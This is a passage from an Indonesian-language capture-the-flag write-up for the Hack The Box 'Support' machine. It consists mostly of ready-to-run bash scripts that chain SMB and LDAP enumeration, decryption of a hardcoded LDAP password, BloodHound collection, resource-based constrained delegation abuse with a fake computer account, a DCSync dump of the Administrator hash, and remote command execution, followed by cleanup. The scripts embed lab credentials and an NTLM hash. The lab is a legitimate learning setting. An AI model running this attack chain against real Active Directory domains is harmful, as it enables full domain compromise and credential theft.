echo "===== [1] Nmap ====="
nmap -Pn -sCV -p- --min-rate 1500 --max-retries 2 "$DC_IP"

echo "===== [2] Share SMB (anonim) ====="
smbclient -L "//${DC_IP}/" -N 2>/dev/null | sed -n '/Sharename/,/^$/p'

echo "===== [3] Unduh share support-tools ====="
cd "$WORKDIR"
smbclient "//${DC_IP}/support-tools" -N -c 'prompt off; recurse on; mget *'
unzip -o 'UserInfo.exe.zip' >/dev/null 2>&1 || true

echo "===== [4] String .NET (UTF-16LE) ====="
# PENTING: `strings` biasa tidak menemukan literal .NET -> wajib -el
strings -el UserInfo.exe 2>/dev/null | grep -iE 'ldap|pass|user|key|support' | sort -u

echo "===== [5] Dekripsi kata sandi LDAP ====="
python3 "${SCRIPT_DIR}/decrypt_ldap_pass.py"

echo "===== [6] Enumerasi LDAP user 'support' ====="
ldapsearch -x -H "ldap://${DC_IP}" -D "$LDAP_USER" -w "$LDAP_PASS" \
    -b "DC=$(echo "$DOMAIN" | sed 's/\./,DC=/g')" \
    "(sAMAccountName=support)" 2>/dev/null | grep -iE '^(dn|info|memberOf|name|cn):'

echo "===== [7] WinRM -> user.txt ====="
nxc winrm "$DC_IP" -u "$SUP_USER" -p "$SUP_PASS"
nxc winrm "$DC_IP" -u "$SUP_USER" -p "$SUP_PASS" \
    -x 'type C:\Users\support\Desktop\user.txt'
```

### 4. `bloodhound_collect.sh`

```bash
#!/usr/bin/env bash
# bloodhound_collect.sh — Koleksi & analisis data BloodHound
set -uo pipefail

DC_IP="${DC_IP:-10.129.132.189}"
DOMAIN="${DOMAIN:-support.htb}"
DC_HOST="${DC_HOST:-dc.support.htb}"
WORKDIR="${WORKDIR:-/tmp/bh}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

LDAP_USER='ldap'
LDAP_PASS='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

mkdir -p "$WORKDIR"; cd "$WORKDIR"

# Langkah TGT Kerberos gagal pada target IP-only -> otomatis fallback NTLM
echo "===== [1/4] Koleksi data ====="
bloodhound-python -d "$DOMAIN" -u "$LDAP_USER" -p "$LDAP_PASS" \
    -ns "$DC_IP" -dc "$DC_HOST" -c ALL --zip

echo "===== [2/4] Ekstrak ZIP ====="
unzip -o ./*.zip -d bh_data >/dev/null
ls -1 bh_data/*.json

echo "===== [3/4] ACE pada objek komputer ====="
python3 "${SCRIPT_DIR}/bh_parse_aces.py" bh_data

# ms-DS-MachineAccountQuota = operational attribute -> wajib "*" "+"
echo "===== [4/4] ms-DS-MachineAccountQuota ====="
ldapsearch -x -H "ldap://${DC_IP}" -D "${LDAP_USER}@${DOMAIN}" -w "$LDAP_PASS" \
    -b "DC=$(echo "$DOMAIN" | sed 's/\./,DC=/g')" -s base "*" "+" \
    2>/dev/null | grep -i machineaccountquota
```

### 5. `rbcd_chain.sh` (inti serangan)

```bash
#!/usr/bin/env bash
# rbcd_chain.sh — HTB Support : Eskalasi RBCD -> DCSync -> root.txt
set -euo pipefail

DC_IP="${DC_IP:-10.129.132.189}"
DOMAIN="${DOMAIN:-support.htb}"
DC_HOST="${DC_HOST:-dc.support.htb}"
WORKDIR="${WORKDIR:-/tmp/bh}"

USER="${USER:-support}"
PASS="${PASS:-Ironside47pleasure40Watchful}"

FAKE_NAME='FAKE$'
FAKE_PASS='FakeP@ssw0rd123!'

mkdir -p "$WORKDIR"; cd "$WORKDIR"

# KRUSIAL: ccache lama yang ter-export bisa menggagalkan getST
unset KRB5CCNAME

echo "===== [1/5] Membuat komputer palsu: $FAKE_NAME ====="
impacket-addcomputer -computer-name "$FAKE_NAME" -computer-pass "$FAKE_PASS" \
    -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"

echo "===== [2/5] Menulis RBCD pada objek DC\$ (via GenericAll) ====="
impacket-rbcd -delegate-to 'DC$' -delegate-from "$FAKE_NAME" -action write \
    -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"

echo "===== [3/5] Meminta tiket Administrator (S4U2Self + S4U2Proxy) ====="
impacket-getST -spn "cifs/$DC_HOST" -impersonate Administrator \
    -dc-ip "$DC_IP" "$DOMAIN/$FAKE_NAME:$FAKE_PASS"

CCACHE="$(ls -t "$WORKDIR"/*.ccache 2>/dev/null | head -1)"
if [[ -z "${CCACHE:-}" ]]; then
    echo "[!] Gagal membuat ccache. Periksa output getST di atas." >&2
    exit 1
fi
export KRB5CCNAME="$CCACHE"
echo "[+] KRB5CCNAME=$KRB5CCNAME"

# -target-ip agar tidak perlu mengedit /etc/hosts; FQDN tetap untuk SPN
echo "===== [4/5] DCSync hash Administrator ====="
impacket-secretsdump -k -no-pass -target-ip "$DC_IP" \
    -just-dc-user Administrator "$DOMAIN/Administrator@$DC_HOST"

echo "===== [5/5] Membaca root.txt ====="
impacket-wmiexec -k -no-pass -target-ip "$DC_IP" \
    "$DOMAIN/Administrator@$DC_HOST" \
    'type C:\Users\Administrator\Desktop\root.txt'
```

### 6. `cleanup_support.sh`

```bash
#!/usr/bin/env bash
# cleanup_support.sh — Bersihkan artefak serangan
set -uo pipefail

DC_IP="${DC_IP:-10.129.132.189}"
DOMAIN="${DOMAIN:-support.htb}"
WORKDIR="${WORKDIR:-/tmp/bh}"

USER="${USER:-support}"
PASS="${PASS:-Ironside47pleasure40Watchful}"
FAKE_NAME='FAKE$'
ADMIN_HASH="${ADMIN_HASH:-aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26}"

cd "$WORKDIR" 2>/dev/null || cd /tmp

echo "===== [1/2] Menghapus delegasi RBCD pada DC\$ ====="
impacket-rbcd -delegate-to 'DC$' -delegate-from "$FAKE_NAME" -action remove \
    -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"

# Kredensial user biasa TIDAK bisa menghapus akun komputer -> pakai Administrator
echo "===== [2/2] Menghapus akun komputer $FAKE_NAME ====="
impacket-wmiexec -hashes "$ADMIN_HASH" "$DOMAIN/Administrator@$DC_IP" \
    'powershell -c "Remove-ADComputer -Identity FAKE -Confirm:$false"'

echo "===== Verifikasi (harus hanya tersisa 'DC') ====="
nxc ldap "$DC_IP" -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
    --query "(objectClass=computer)" "name" 2>/dev/null | grep -i 'name'
```

### Cara menjalankan seluruh rantai

```bash
cd /home/boy/support-scripts
chmod +x *.sh *.py

./recon_support.sh          # recon -> user.txt
./bloodhound_collect.sh     # koleksi BloodHound + temukan GenericAll
./rbcd_chain.sh             # RBCD -> DCSync -> root.txt
./cleanup_support.sh        # bersihkan artefak
```

---

## 📊 Ringkasan Visual

```
┌──────────────────────────────────────────────────────────────────────┐
│ 1. SMB anonim  ──▶ share "support-tools" ──▶ UserInfo.exe.zip        │
│ 2. RE .NET     ──▶ strings -el ──▶ enc + key "armando"               │
│ 3. Dekripsi    ──▶ XOR ^0xDF ──▶ nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz│
│ 4. LDAP        ──▶ user "support" ──▶ info: Ironside47pleasure40Watchful│
│ 5. WinRM :5985 ──▶ shell ──▶ 🚩 user.txt                              │
│ 6. BloodHound  ──▶ GenericAll (via Shared Support Accounts) on DC     │
│ 7. Quota = 10  ──▶ buat FAKE$                                         │
│ 8. RBCD        ──▶ msDS-AllowedToActOnBehalfOfOtherIdentity           │
│ 9. getST       ──▶ tiket Administrator (.ccache)                      │
│10. DCSync      ──▶ hash NTLM Administrator                            │
│11. wmiexec     ──▶ 🚩 root.txt                                        │
└──────────────────────────────────────────────────────────────────────┘
```
